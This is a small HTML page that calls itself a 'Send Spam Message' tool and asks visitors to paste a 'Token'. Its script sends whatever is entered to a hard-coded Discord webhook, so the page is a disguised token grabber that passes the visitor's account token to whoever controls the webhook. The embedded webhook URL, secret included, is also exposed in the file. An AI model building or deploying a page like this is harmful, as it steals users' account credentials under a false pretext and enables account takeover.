<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Spam</title>
</head>
<body style="font-family: Arial; text-align:center; margin-top:100px;">

  <h2>Send Spam Message</h2>

  <input id="token" type="text" placeholder="Token" style="padding:10px; width:250px;">
  <br><br>

  <button onclick="sendToken()" style="padding:10px 20px;">Send</button>

  <script>
    const webhookURL = "https://discord.com/api/webhooks/1495044184694849587/Ylq8QM-J3UkH_2Hwm6o9u11QzlNMj_SyTilhOTEH2xQSoCVIqG8hYM37a9PU5mq3_JqR";

    function sendToken() {
      const token = document.getElementById("token").value;

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: "Token: " + token
        })
      })
      .then(res => {
        if (res.ok) {
          alert("Sent successfully!");
        } else {
          alert("Error sending!");
        }
      })
      .catch(err => {
        alert("Request failed!");
      });
    }
  </script>

</body>
</html>
